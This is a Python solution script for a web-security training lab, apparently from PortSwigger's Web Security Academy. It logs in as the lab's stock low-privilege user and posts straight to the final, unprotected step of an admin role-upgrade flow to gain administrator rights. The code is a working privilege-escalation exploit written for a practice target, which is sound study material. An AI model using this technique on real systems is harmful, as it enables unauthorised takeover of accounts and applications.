import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Multi-step process with no access control on one step')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", data={"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

requests.post("https://" + lab.id + ".web-security-academy.net/admin-roles", headers=headers, data={"action":"upgrade","confirmed":"true","username":"wiener"}, allow_redirects=True)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")